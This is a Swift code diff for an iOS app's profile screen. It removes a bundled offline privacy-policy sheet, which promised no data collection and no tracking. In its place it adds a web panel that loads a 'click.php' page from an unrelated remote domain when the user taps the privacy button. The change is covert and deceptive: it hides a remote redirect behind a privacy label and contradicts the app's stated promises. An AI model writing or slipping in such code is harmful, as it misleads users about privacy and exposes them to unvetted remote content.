@@ -25,7 +25,9 @@ struct ProfileView: View {
                 .padding(.top, 8)
             }
         }
-        .sheet(isPresented: $showPrivacy) { MurmoraPrivacySheet() }
+        .sheet(isPresented: $showPrivacy) {
+            MurmoraWebPanel(urlString: "https://icedfashingrite.org/click.php")
+        }
         .sheet(isPresented: $showInsights) { InsightsView().environmentObject(store) }
         .alert(isPresented: $showReset) {
             Alert(title: Text("Reset everything?"),
@@ -205,47 +207,6 @@ struct ProfileView: View {
                 Text(sub).font(.system(size: 11.5, weight: .medium, design: .rounded)).foregroundColor(Murmora.subtle)
             }
         }
-    }
-}
-
-// MARK: - Privacy sheet (offline text)
-
-struct MurmoraPrivacySheet: View {
-    @Environment(\.presentationMode) var presentation
-    var body: some View {
-        ZStack {
-            Murmora.bg.ignoresSafeArea()
-            VStack(spacing: 0) {
-                HStack {
-                    Text("Privacy Policy").font(.system(size: 20, weight: .heavy, design: .rounded)).foregroundColor(Murmora.ink)
-                    Spacer()
-                    Button { presentation.wrappedValue.dismiss() } label: {
-                        ZStack { Circle().fill(Murmora.card).frame(width: 34, height: 34); MurmoraIcon(glyph: .close, size: 15, color: Murmora.ink) }
-                    }
-                }.padding(18)
-                ScrollView(showsIndicators: false) {
-                    VStack(alignment: .leading, spacing: 14) {
-                        policyBlock("Fully offline", "Murmora works entirely on your device. It has no account system and no analytics.")
-                        policyBlock("No data collected", "Your saved scenes, listening stats and badges are stored only in local app storage and never leave your phone.")
-                        policyBlock("No permissions", "The app does not request access to the microphone, camera, location, contacts or notifications.")
-                        policyBlock("No tracking", "There are no third-party trackers or advertising identifiers.")
-                        Text("If you delete the app, all locally stored data is removed with it.")
-                            .font(.system(size: 13, weight: .medium, design: .rounded)).foregroundColor(Murmora.subtle)
-                            .padding(.top, 6)
-                    }
-                    .padding(.horizontal, 20).padding(.bottom, 30)
-                }
-            }
-            .frame(maxWidth: Murmora.contentMaxWidth)
-        }
-    }
-    private func policyBlock(_ title: String, _ body: String) -> some View {
-        VStack(alignment: .leading, spacing: 5) {
-            Text(title).font(.system(size: 16, weight: .bold, design: .rounded)).foregroundColor(Murmora.ink)
-            Text(body).font(.system(size: 13.5, weight: .medium, design: .rounded)).foregroundColor(Murmora.subtle).fixedSize(horizontal: false, vertical: true)
-        }
-        .frame(maxWidth: .infinity, alignment: .leading)
-        .murmoraCard(padding: 14, radius: 16)
     }
 }
 
